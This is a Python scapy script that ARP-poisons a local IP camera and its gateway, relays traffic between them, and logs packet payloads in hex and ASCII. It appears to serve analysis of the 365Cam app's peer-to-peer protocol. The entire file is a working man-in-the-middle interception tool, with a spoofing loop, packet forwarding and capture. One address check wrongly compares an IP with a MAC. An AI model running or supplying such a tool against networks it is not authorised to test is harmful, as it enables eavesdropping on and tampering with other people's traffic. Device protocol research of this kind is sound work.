#!/usr/bin/env python3
"""
ARP-spoof + capture. Logs to capture_log.txt
"""
from scapy.all import *
import threading
import time, datetime, sys

CAM_IP = "192.168.1.148"
GW_IP = "192.168.1.1"
P2P_PORTS = {32100, 32108, 17700, 17701, 17702, 17703, 17704, 17705, 17706}

# Log to file
logfile = open(r"E:\open_camera\apk_analysis\capture_log.txt", "w", buffering=1)

def log(msg):
    timestamp = datetime.datetime.now().strftime("%H:%M:%S")
    line = f"[{timestamp}] {msg}"
    print(line)
    logfile.write(line + "\n")
    logfile.flush()

my_mac = None
real_gw_mac = None
cam_mac = None
running = True

log("Starting capture setup...")
conf.verb = 0

my_mac = Ether().src
try:
    real_gw_mac = getmacbyip(GW_IP)
except:
    log("WARNING: Could not get gateway MAC")
try:
    cam_mac = getmacbyip(CAM_IP)
except:
    log("WARNING: Could not get camera MAC")

log(f"My MAC: {my_mac}")
log(f"Gateway: {real_gw_mac}")
log(f"Camera: {cam_mac}")

def spoof_loop():
    while running:
        if cam_mac:
            pkt = ARP(op=2, pdst=CAM_IP, hwdst=cam_mac, psrc=GW_IP, hwsrc=my_mac)
            send(pkt, verbose=False)
        if real_gw_mac:
            pkt = ARP(op=2, pdst=GW_IP, hwdst=real_gw_mac, psrc=CAM_IP, hwsrc=my_mac)
            send(pkt, verbose=False)
        time.sleep(0.5)

def restore_arp():
    if cam_mac and real_gw_mac:
        for _ in range(3):
            send(ARP(op=2, pdst=CAM_IP, hwdst=cam_mac, psrc=GW_IP, hwsrc=real_gw_mac), verbose=False)
            send(ARP(op=2, pdst=GW_IP, hwdst=real_gw_mac, psrc=CAM_IP, hwsrc=cam_mac), verbose=False)
            time.sleep(0.3)
    log("ARP restored")

def handle_packet(pkt):
    if not pkt.haslayer(IP):
        return
    src = pkt[IP].src
    dst = pkt[IP].dst
    if src != CAM_IP and dst != CAM_IP:
        return
    
    direction = "OUT" if src == CAM_IP else "IN "
    if pkt.haslayer(UDP):
        sport = pkt[UDP].sport
        dport = pkt[UDP].dport
        payload = bytes(pkt[UDP].payload)
        hexdata = payload.hex()[:120]
        tag = ""
        if payload and len(payload) >= 2 and payload[0] in (0xf1, 0xd1):
            tag = " [PPPP]"
        if sport in P2P_PORTS or dport in P2P_PORTS:
            tag += " [P2P]"
        log(f"UDP {direction} {src}:{sport} -> {dst}:{dport} len={len(payload)} hex={hexdata}{tag}")
    elif pkt.haslayer(TCP):
        dport = pkt[TCP].dport
        sport = pkt[TCP].sport
        flags = pkt[TCP].flags
        payload = bytes(pkt[TCP].payload)
        info = f"len={len(payload)}"
        if payload:
            try:
                text = payload.decode('ascii', errors='ignore')[:150]
                info += f" text={text!r}"
            except:
                pass
        log(f"TCP {direction} {src}:{sport} -> {dst}:{dport} [{flags}] {info}")

def forward_packet(pkt):
    if not pkt.haslayer(IP):
        return
    src = pkt[IP].src
    dst = pkt[IP].dst
    if src == CAM_IP and dst != GW_IP and dst != my_mac:
        if real_gw_mac and cam_mac:
            # Internet-bound from camera: forward to real gateway
            pkt[Ether].src = my_mac
            pkt[Ether].dst = real_gw_mac
            try:
                sendp(pkt, iface=conf.iface, verbose=False)
            except:
                pass
    elif dst == CAM_IP and src != my_mac:
        if cam_mac:
            # Incoming to camera: forward to camera
            pkt[Ether].src = my_mac
            pkt[Ether].dst = cam_mac
            try:
                sendp(pkt, iface=conf.iface, verbose=False)
            except:
                pass

# Start ARP spoof
spoof_thread = threading.Thread(target=spoof_loop, daemon=True)
spoof_thread.start()
time.sleep(1)

log("=" * 60)
log("CAPTURE ACTIVE - Open 365Cam app and view camera NOW")
log(f"Filter: host {CAM_IP}")
log("Press Ctrl+C to stop")
log("=" * 60)

try:
    sniff(filter=f"host {CAM_IP}", prn=lambda p: (handle_packet(p), forward_packet(p)), store=False)
except KeyboardInterrupt:
    pass
except Exception as e:
    log(f"Error: {e}")
finally:
    running = False
    restore_arp()
    log("Capture complete")
    logfile.close()
